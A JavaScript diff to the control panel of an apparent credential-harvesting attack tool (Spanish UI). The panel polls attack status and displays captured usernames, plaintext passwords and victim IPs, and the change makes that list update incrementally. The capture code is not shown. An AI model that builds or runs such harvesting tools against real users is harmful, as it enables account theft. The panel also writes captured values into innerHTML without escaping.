@@ -1,4 +1,8 @@
 let _attackPollInterval = null;
+let _renderedCredKeys = new Set();
+let _lastNewCredTs = null;
+let _newBadgeTimer = null;
+let _lastCredCount = 0;
 
 const PHASE_LABELS = {
   IDLE: 'EN ESPERA',
@@ -9,6 +13,9 @@ const PHASE_LABELS = {
 };
 
 function renderAttack() {
+  _renderedCredKeys = new Set();
+  _lastCredCount = 0;
+  if (_newBadgeTimer) { clearTimeout(_newBadgeTimer); _newBadgeTimer = null; }
   const el = document.getElementById('view-attack');
   el.innerHTML = `
     <div class="max-w-2xl">
@@ -104,7 +111,8 @@ async function pollAttackStatus() {
     const credCount = cnt.credenciales_capturadas || 0;
     document.getElementById('cnt-creds').textContent = credCount;
 
-    if (credCount > 0) {
+    if (credCount > 0 && credCount > _lastCredCount) {
+      _lastCredCount = credCount;
       const cdata = await api.credentials();
       renderCredentials(cdata.credenciales || []);
     }
@@ -122,14 +130,29 @@ function renderCredentials(creds) {
   const none = document.getElementById('no-creds');
   const badge = document.getElementById('cred-badge');
   if (!creds.length) return;
-  none.style.display = 'none';
-  if (badge) badge.classList.remove('hidden');
-  list.innerHTML = creds.map(c =>
-    `<li class="bg-gray-700 rounded p-2">
-       <span class="text-green-400">${c.usuario}</span> / <span class="text-yellow-300">${c.password}</span>
-       <span class="text-gray-400 text-xs ml-2">${c.cliente_ip} &bull; ${new Date(c.timestamp_ms).toLocaleTimeString()}</span>
-     </li>`
-  ).join('');
+  if (none) none.style.display = 'none';
+
+  let addedAny = false;
+  creds.forEach(c => {
+    const key = `${c.timestamp_ms}:${c.usuario}`;
+    if (_renderedCredKeys.has(key)) return;
+    _renderedCredKeys.add(key);
+    addedAny = true;
+    const li = document.createElement('li');
+    li.className = 'bg-gray-700 rounded p-2';
+    li.innerHTML = `<span class="text-green-400">${c.usuario}</span> / <span class="text-yellow-300">${c.password}</span>
+      <span class="text-gray-400 text-xs ml-2">${c.cliente_ip} &bull; ${new Date(c.timestamp_ms).toLocaleTimeString()}</span>`;
+    list.appendChild(li);
+  });
+
+  if (addedAny) {
+    if (badge) badge.classList.remove('hidden');
+    _lastNewCredTs = Date.now();
+    if (_newBadgeTimer) clearTimeout(_newBadgeTimer);
+    _newBadgeTimer = setTimeout(() => {
+      if (badge) badge.classList.add('hidden');
+    }, 5000);
+  }
 }
 
 async function stopAttack() {
